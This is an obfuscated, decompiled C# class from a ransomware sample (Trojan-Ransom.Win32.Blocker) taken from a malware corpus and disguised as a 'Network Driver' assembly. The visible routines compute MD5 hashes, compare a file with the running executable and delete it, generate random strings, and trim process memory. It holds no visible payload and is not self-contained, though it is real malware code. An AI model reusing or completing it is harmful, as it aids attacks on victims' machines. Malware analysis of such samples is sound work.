// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Network Driver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 31A0C38B-3584-42BE-8C71-509BA5DF4465
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.cnvx-6c4df7ef35e4d5aa4c5d4df1ed2dc33691c7736a.exe

using \u0001;
using \u0004;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0004
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    private static Random \u0001;

    public static string \u0003([In] string obj0)
    {
      MD5 md5 = (MD5) new MD5CryptoServiceProvider();
      byte[] numArray = \u0008\u0002.\u007E\u001C\u0004((object) md5, \u0097\u0003.\u007E\u0083\u0003((object) \u0080\u0002.\u0084\u0003(), obj0));
      return \u0090\u0002.\u007E\u0092((object) \u001D\u0003.\u007E\u0094((object) \u001E\u0003.\u000F\u0002(numArray), \u0002.\u0001(1055), \u0002.\u0001(1060)));
    }

    private static string \u0004([In] string obj0)
    {
      FileStream fileStream = \u0093\u0003.\u009E\u0003(obj0);
      MD5 md5 = (MD5) new MD5CryptoServiceProvider();
      byte[] numArray = \u0095\u0002.\u007E\u001B\u0004((object) md5, (Stream) fileStream);
      \u0090\u0003.\u007E\u0094\u0003((object) fileStream);
      return \u0090\u0002.\u007E\u0092((object) \u001D\u0003.\u007E\u0094((object) \u001E\u0003.\u000F\u0002(numArray), \u0002.\u0001(1055), \u0002.\u0001(1060)));
    }

    public static bool \u0003([In] string obj0)
    {
      if (!\u001F\u0003.\u009C\u0003(obj0))
        return false;
      if (!\u0005\u0003.\u0086(\u0002.\u0004(obj0), \u0002.\u0004(\u0090\u0002.\u007E\u0008\u0005((object) \u0014\u0002.\u007E\u0002\u0005((object) \u0014\u0003.\u0004\u0005())))))
        return true;
      \u008E\u0002.\u009B\u0003(obj0);
      return false;
    }

    public static string \u0003([In] int obj0)
    {
      string str1 = \u0002.\u0001(1061);
      string str2 = string.Empty;
      for (int index = 0; index < obj0; ++index)
        str2 = \u0091\u0003.\u0097(str2, \u008B\u0003.\u007E\u008B((object) str1, \u0002\u0003.\u007E\u0084\u0002((object) \u0002.\u0001, 0, \u009B.\u007E\u0088((object) str1)), 1));
      return str2;
    }

    public static void \u0003()
    {
      \u0017\u0003.\u001E\u0002();
      \u0017\u0003.\u001F\u0002();
      if (\u008A\u0003.\u007E\u0082\u0002((object) \u008D\u0002.\u001A\u0002()) != PlatformID.Win32NT)
        return;
      \u0002.\u0003(\u008C\u0003.\u007E\u0001\u0005((object) \u0014\u0003.\u0004\u0005()), -1, -1);
    }

    [DllImport("kernel32", EntryPoint = "SetProcessWorkingSetSize")]
    private static extern int \u0003([In] IntPtr obj0, [In] int obj1, [In] int obj2);

    static \u0002()
    {
      \u0003.\u0003();
      \u0002.\u0001 = new Random();
    }
  }
}
